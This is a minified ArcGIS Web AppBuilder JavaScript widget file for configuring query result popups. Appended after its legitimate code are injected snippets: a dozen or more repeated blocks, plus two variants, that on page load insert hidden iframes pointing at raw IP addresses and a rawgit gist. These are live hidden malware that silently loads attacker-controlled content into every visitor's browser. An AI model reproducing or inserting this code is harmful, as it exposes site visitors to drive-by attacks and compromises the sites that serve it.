// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Query/setting/PopupConfig.html":'\x3cdiv\x3e\r\n\t\x3cdiv style\x3d"margin-top:15px;margin-bottom:10px;"\x3e\r\n\t\t\x3cdiv class\x3d"radio-label-container radio-div portal-radio-div"\x3e\r\n\t\t\t\x3cinput type\x3d"radio" data-dojo-attach-point\x3d"portalRadio" class\x3d"jimu-radio-btn"/\x3e\r\n\t\t\t\x3clabel data-dojo-attach-point\x3d"portalLabel"\x3e${nls.webMapPopupTip}\x3c/label\x3e\r\n\t\t\x3c/div\x3e\r\n\t\t\x3cdiv class\x3d"radio-label-container radio-div custom-radio-div" style\x3d"margin-top:15px;"\x3e\r\n\t\t\t\x3cinput type\x3d"radio" data-dojo-attach-point\x3d"customRadio" class\x3d"jimu-radio-btn"/\x3e\r\n\t\t\t\x3clabel data-dojo-attach-point\x3d"customLabel" checked\x3e${nls.customPopupTip}\x3c/label\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\t\x3ctable class\x3d"title-sorting-table"\x3e\r\n\t\t\x3ccolgroup\x3e\r\n\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\x3ccol width\x3d"38px"\x3e\x3c/col\x3e\r\n\t\t\x3c/colgroup\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr class\x3d"indent-tr"\x3e\r\n\t\t\t\t\x3ctd colspan\x3d"2" class\x3d"indent-td" style\x3d"padding-bottom:4px;"\x3e\r\n\t\t\t\t\t\x3cspan class\x3d"light-stress"\x3e${nls.resultItemTitle}:\x3c/span\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr class\x3d"indent-tr"\x3e\r\n\t\t\t\t\x3ctd class\x3d"indent-td"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"titleTextBox" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t\t\t\t\tdata-dojo-props\x3d\'required:true,trim:true\' style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"btnAddFields" data-dojo-attach-event\x3d"onclick:_onAddClicked" class\x3d"setting-btn btn-add-fields jimu-float-trailing"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-add"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr class\x3d"indent-tr"\x3e\r\n\t\t\t\t\x3ctd colspan\x3d"2" class\x3d"indent-td" style\x3d"padding-top:10px;padding-bottom:4px;"\x3e\r\n\t\t\t\t\t\x3cspan class\x3d"light-stress"\x3e${nls.resultItemContent}:\x3c/span\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr class\x3d"indent-tr"\x3e\r\n\t\t\t\t\x3ctd class\x3d"indent-td"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"displayFieldsTextBox" class\x3d"display-fields-textbox" data-dojo-type\x3d"dijit/form/ValidationTextBox"\r\n\t\t\t\t\tdata-dojo-props\x3d\'required:true,trim:true,disabled:true\' style\x3d"width:100%;" /\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"btnSetDisplayFields" class\x3d"setting-btn btn-display-fields jimu-float-trailing" data-dojo-attach-event\x3d"onclick:_onBtnSetDisplayFieldsClicked"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-edit"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd colspan\x3d"2" style\x3d"padding-top:15px;padding-bottom:7px;"\x3e\r\n\t\t\t\t\t\x3cspan class\x3d"light-stress"\x3e${nls.sortingFields}:\x3c/span\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd data-dojo-attach-point\x3d"tdSortFields"\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"sortFieldsDiv" class\x3d"sort-fields-div jimu-ellipsis"\x3e\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"btnSortFields" class\x3d"setting-btn btn-sort-fields jimu-float-trailing" data-dojo-attach-event\x3d"onclick:_onBtnSortFieldsClicked"\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"jimu-icon jimu-icon-edit" data-dojo-attach-point\x3d"sortFieldsIcon"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\t\x3cdiv data-dojo-attach-point\x3d"displayFieldsSection" style\x3d"display:none;"\x3e\r\n\t\t\x3cdiv data-dojo-attach-point\x3d"displayFieldsDiv"\x3e\r\n\t\t\t\x3cdiv style\x3d"margin-top:7px;margin-bottom:8px;font-size:12px;"\x3e${nls.fieldsSetTip}\x3c/div\x3e\r\n\t\t  \x3cdiv data-dojo-attach-point\x3d"fieldsContainer"\x3e\x3c/div\x3e\r\n\t\t\x3c/div\x3e\r\n\t\x3c/div\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin dojo/text!./PopupConfig.html dojo/_base/lang dojo/_base/html dojo/_base/array dojo/on dojo/query jimu/utils jimu/dijit/SimpleTable jimu/dijit/Popup dijit/TooltipDialog dijit/Menu dijit/MenuItem dijit/popup ./SortFields ../utils".split(" "),function(r,t,u,v,w,c,e,f,x,l,h,y,m,z,A,n,k,B,p){return r([t,u,v],{baseClass:"jimu-query-setting-popup-config",templateString:w,_currentOrderByFields:null,_validSortFieldTypes:"esriFieldTypeOID esriFieldTypeString esriFieldTypeDate esriFieldTypeSmallInteger esriFieldTypeInteger esriFieldTypeSingle esriFieldTypeDouble".split(" "),
nls:null,sqs:null,postCreate:function(){this.inherited(arguments);h.combineRadioCheckBoxWithLabel(this.portalRadio,this.portalLabel);h.combineRadioCheckBoxWithLabel(this.customRadio,this.customLabel);var a=h.groupRadios([this.portalRadio,this.customRadio],c.hitch(this,this._updateClassWhenRadioChanged));f.forEach(a,c.hitch(this,function(a){this.own(a)}));this._currentOrderByFields=[];this._initFieldsTable();this._initAddFields();this.onLayerChange(!0);this._updateClassWhenRadioChanged()},onLayerChange:function(a){this._clear();
this.portalRadio.disabled=a?!1:!0;this._updateClassWhenRadioChanged();if(a=this._getLayerDefinition()){this._clear();var b={popupInfo:null,orderByFields:[]};b.popupInfo=this._getDefaultPopupInfo();this.setConfig(b);this._updateSortingIcon(a)}},setConfig:function(a){this._clear();this.config=c.clone(a);var b=this._getLayerDefinition();b&&(this._updateSortingIcon(b),this._setPopupInfoForUI(a.popupInfo),this._setOrderByFields(a.orderByFields))},getConfig:function(){var a={popupInfo:this._getPopupInfoByUI(),
orderByFields:this._getOrderByFields()};return a.popupInfo?a:null},destroy:function(){this.sqs=null;this.titleTextBox.focusNode.blur();this.inherited(arguments)},_clear:function(){e.addClass(this.sortFieldsIcon,"jimu-state-disabled");this._currentOrderByFields=[];this.titleTextBox.set("value","");this.displayFieldsTextBox.set("value","");this.fieldsTable.clear();this._resetMenu();this._addEmptyMenuItem()},_getLayerDefinition:function(){return this.sqs._layerDefinition},_updateClassWhenRadioChanged:function(){!this.portalRadio.disabled&&
this.portalRadio.checked?e.addClass(this.domNode,"portal-radio-selected"):e.removeClass(this.domNode,"portal-radio-selected")},_setPopupInfoForUI:function(a){var b=this._getDefaultPopupInfo();this._setCustomPopupInfoForUI(b);!this.portalRadio.disabled&&a.readFromWebMap?(this.customRadio.checked=!1,this.portalRadio.checked=!0):(this.portalRadio.checked=!1,this.customRadio.checked=!0,this._setCustomPopupInfoForUI(a));this._updateClassWhenRadioChanged()},_setCustomPopupInfoForUI:function(a){var b=this._getLayerDefinition(),
g=p.getPortalFieldInfosWithoutShape(b,a.fieldInfos);a.title&&"string"===typeof a.title?this.titleTextBox.set("value",a.title||""):this.titleTextBox.set("value","");this._updateDisplayFieldsTextBox(g);var q=[],d=f.map(b.fields,c.hitch(this,function(a){return a.name}));f.forEach(a.mediaInfos,c.hitch(this,function(a){if(0<d.length&&"image"===a.type&&a.value){var b=a.value.sourceURL,g=null;f.some(d,c.hitch(this,function(a){return"{"+a+"}"===b?(g=a,!0):!1}));g&&q.push(g)}}));this._resetMenu();this.fieldsTable.clear();
0<g.length?f.forEach(g,c.hitch(this,function(a){this._addMenuItem(a);var b=0<=q.indexOf(a.fieldName);this._addRow(a,b)})):this._addEmptyMenuItem()},_updateDisplayFieldsTextBox:function(a){a=f.filter(a,c.hitch(this,function(a){return a.visible}));a=f.map(a,function(a){return a.label}).join(";  ");this.displayFieldsTextBox.set("value",a)},_addRow:function(a,b){a=c.clone(a);a.specialType=b?"image":"none";this.fieldsTable.addRow(a)},_addMenuItem:function(a){var b=new n({label:a.fieldName+" {"+a.fieldName+
"}",onClick:c.hitch(this,function(){var b=this.titleTextBox.get("value")+"{"+a.fieldName+"}";this.titleTextBox.set("value",b);b=this.menu.getParent();e.setStyle(b.domNode.parentNode,"display","none")})});this.menu.addChild(b)},_addEmptyMenuItem:function(){var a=new n({label:this.nls.noField,onClick:c.hitch(this,function(){var a=this.menu.getParent();e.setStyle(a.domNode.parentNode,"display","none")})});this.menu.addChild(a)},_getPopupInfoByUI:function(){var a=null;if(this.customRadio.checked){if(a=
this._getCustomPopupInfoByUI())a.readFromWebMap=!1}else a={readFromWebMap:!0};return a},_getCustomPopupInfoByUI:function(){var a={title:"",fieldInfos:[],description:null,showAttachments:!1,mediaInfos:[]},b=this._getLayerDefinition();if(!this.titleTextBox.validate())return this.sqs.showResultsSetting(),this.sqs.scrollToDom(this.titleTextBox.domNode),h.showValidationErrorTipForFormDijit(this.titleTextBox),null;a.title=this.titleTextBox.get("value");a.showAttachments=!!b.hasAttachments;b=this._getPortalFieldInfosAndMediaInfosByUI();
a.fieldInfos=b.portalFieldInfos;a.mediaInfos=b.mediaInfos;return a},_getPortalFieldInfosAndMediaInfosByUI:function(){var a=this.fieldsTable.getData(),b=[];return{portalFieldInfos:f.map(a,c.hitch(this,function(a){var c=a.fieldName,d=this._getDefaultPortalFieldInfo(c);d.label=a.label||d.label;(d.visible=a.visible)&&"image"===a.specialType&&(a="{"+c+"}",b.push({title:"",type:"image",caption:c,value:{sourceURL:a,linkURL:a}}));return d})),mediaInfos:b}},_getDefaultPopupInfo:function(){var a=this._getLayerDefinition();
return p.getDefaultPopupInfo(a,!1)},_getDefaultPortalFieldInfo:function(a){a=this._getServiceFildInfo(a);return h.getDefaultPortalFieldInfo(a)},_getServiceFildInfo:function(a){var b=null,b=this._getLayerDefinition();return b=h.getFieldInfoByFieldName(b.fields,a)},_getSortedFieldInfos:function(a,b){var g=[],e={};f.forEach(b,c.hitch(this,function(a){e[a.name]=a}));var d=[],d=d.concat(a);f.forEach(b,c.hitch(this,function(a){a=a.name;0>d.indexOf(a)&&d.push(a)}));return g=f.map(d,c.hitch(this,function(a){return e[a]}))},
_onBtnSetDisplayFieldsClicked:function(){var a=new m({width:640,height:380,titleLabel:this.nls.setDisplayFields,content:this.displayFieldsDiv,onClose:c.hitch(this,function(){e.place(this.displayFieldsDiv,this.displayFieldsSection);a.content=""}),buttons:[{label:this.nls.ok,onClick:c.hitch(this,function(){var b=this._getPortalFieldInfosAndMediaInfosByUI().portalFieldInfos;this._updateDisplayFieldsTextBox(b);a.close()})},{label:this.nls.cancel,onClick:c.hitch(this,function(){a.close()})}]})},_setOrderByFields:function(a){a=
a||[];var b=this.sortFieldsDiv.innerHTML="";a=f.map(a,c.hitch(this,function(c,e){var d=c.split(" ");c=d[0];var f="ASC";d[1]&&"string"===typeof d[1]&&(d[1]=d[1].toUpperCase(),"DESC"===d[1]&&(f="DESC"));d=f.toLowerCase();d="\x3cspan\x3e"+c+'\x3c/span\x3e\x3cspan class\x3d"sort-arrow '+d+'"\x3e\x3c/span\x3e';e!==a.length-1&&(d+="\x3cspan\x3e,\x26nbsp;\x3c/span\x3e");b+=d;return c+" "+f}));b&&(b="\x3cspan\x3e\x26nbsp;\x26nbsp;\x3c/span\x3e"+b);this.sortFieldsDiv.innerHTML=b;this._currentOrderByFields=
a},_getOrderByFields:function(){var a=this._getLayerDefinition();return this._shouldEnableSorting(a)?this._currentOrderByFields:[]},_updateSortingIcon:function(a){this._shouldEnableSorting(a)?e.removeClass(this.sortFieldsIcon,"jimu-state-disabled"):e.addClass(this.sortFieldsIcon,"jimu-state-disabled")},_shouldEnableSorting:function(a){return this._isServiceSupportsPagination(a)&&this._isServiceSupportsOrderBy(a)},_onBtnSortFieldsClicked:function(){var a=this._getLayerDefinition();if(a&&this._shouldEnableSorting(a))var b=
new B({nls:this.nls,layerDefinition:a,orderByFields:c.clone(this._currentOrderByFields),validSortFieldTypes:this._validSortFieldTypes}),e=new m({width:640,height:380,titleLabel:this.nls.setSortingFields,content:b,onClose:c.hitch(this,function(){b.destroy()}),buttons:[{label:this.nls.ok,onClick:c.hitch(this,function(){var a=b.getOrderByFields();this._setOrderByFields(a);e.close()})},{label:this.nls.cancel,onClick:c.hitch(this,function(){e.close()})}]})},_initFieldsTable:function(){var a={autoHeight:!1,
style:"height:187px",fields:[{name:"visible",title:this.nls.visibility,type:"checkbox"},{name:"fieldName",title:this.nls.name,type:"text",editable:!1},{name:"label",title:this.nls.alias,type:"text",editable:!0},{name:"specialType",title:this.nls.specialType,type:"extension",create:c.hitch(this,this._createSpecialType),setValue:c.hitch(this,this._setValue4SpecialType),getValue:c.hitch(this,this._getValueOfSpecialType)},{name:"actions",title:this.nls.actions,type:"actions",actions:["up","down"]}]};
this.fieldsTable=new y(a);this.fieldsTable.placeAt(this.fieldsContainer);this.fieldsTable.startup()},_createSpecialType:function(a){a=e.create("select",{},a);e.create("option",{value:"none",label:this.nls.none,selected:!0,innerHTML:this.nls.none},a);e.create("option",{value:"image",label:this.nls.image,innerHTML:this.nls.image},a)},_setValue4SpecialType:function(a,b){l("select",a)[0].value=b},_getValueOfSpecialType:function(a){return l("select",a)[0].value},_initAddFields:function(){var a=e.create("div");
this.tooltipDialog=new z({style:"cursor:pointer",content:a});this.menu=new A;this.menu.placeAt(a);this.own(x(document.body,"click",c.hitch(this,function(){k.close(this.tooltipDialog)})))},_onAddClicked:function(a){a.stopPropagation();a.preventDefault();k.close(this.tooltipDialog);k.open({popup:this.tooltipDialog,around:this.btnAddFields})},_resetMenu:function(){var a=this.menu.getChildren();f.forEach(a,c.hitch(this,function(a){this.menu.removeChild(a)}))},_isServiceSupportsPagination:function(a){var b=
!1;a.advancedQueryCapabilities&&a.advancedQueryCapabilities.supportsPagination&&(b=!0);return b},_isServiceSupportsOrderBy:function(a){var b=!1;a.advancedQueryCapabilities&&a.advancedQueryCapabilities.supportsOrderBy&&(b=!0);return b}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});